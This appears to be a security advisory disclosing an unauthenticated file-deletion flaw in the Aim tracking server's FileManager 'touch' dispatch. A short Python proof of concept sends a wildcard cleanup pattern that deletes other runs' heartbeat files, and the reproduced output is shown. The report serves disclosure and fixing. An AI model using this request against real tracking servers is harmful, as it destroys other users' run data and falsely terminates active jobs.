## Description

`LocalFileManager._cleanup(pattern)` in `aim/sdk/reporter/file_manager.py` globs the **shared** `<repo>/.aim/check_ins` directory and unlinks every match except the lexicographically largest one — no per-run/per-client ownership filter. `touch(filename, cleanup_file_pattern)` exposes this over the tracking server's `read-instruction` dispatch with a fully client-controlled `cleanup_file_pattern` (e.g. `*`).

Heartbeat files are the liveness input for run status: `RunStatusManager._is_run_stalled` (`aim/sdk/run_status_manager.py`) returns `True` whenever a run's heartbeat files are absent (the `else: stalled = True` branch), and `_mark_run_terminated` then sets `end_time` and removes the progress marker.

## Impact

An unauthenticated network client of the tracking server (default `0.0.0.0:53800`) can delete the heartbeat check-ins of *other* runs; the monitoring process then marks still-active runs as terminated — an integrity/availability attack against a shared tracking server.

## PoC

Verified against aim v3.29.1 with a real `aim server --repo <mount>` and three pre-created heartbeat files of a victim run (`<run_hash>-{i}-progress-0-{ts}`, `i=0..2`) under `<repo>/.aim/check_ins/`:

```python
args = pack_args(encode_tree(("zzz-attacker-max", "*")))   # filename sorts LAST so victims are the "all but max" set
requests.post(f"{BASE}/read-instruction/",
              json={"resource_handler": fm_handler, "method_name": "touch",
                    "args": base64.b64encode(args).decode()})
# fm_handler obtained via get-resource with resource_type="FileManager"

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)
```

## Execution result

```
[attacker] touch -> HTTP 200
[evidence] victim heartbeat existed before attack: True
[evidence] victim heartbeat after unauthenticated touch(pattern=*): False
[RESULT] {"poc": "aim-03-heartbeat-cleanup", "verdict": "REPRODUCED",
          "victim_heartbeats": [".../check_ins/deadbeef...-0-progress-0-1699999990",
                                ".../check_ins/deadbeef...-1-progress-0-1699999991",
                                ".../check_ins/deadbeef...-2-progress-0-1699999992"],
          "existed_before": true, "exists_after": false}
```

All three victim heartbeat files were unlinked by the single unauthenticated call; per `run_status_manager.py`, a run with no heartbeat files is evaluated as stalled and gets terminated.
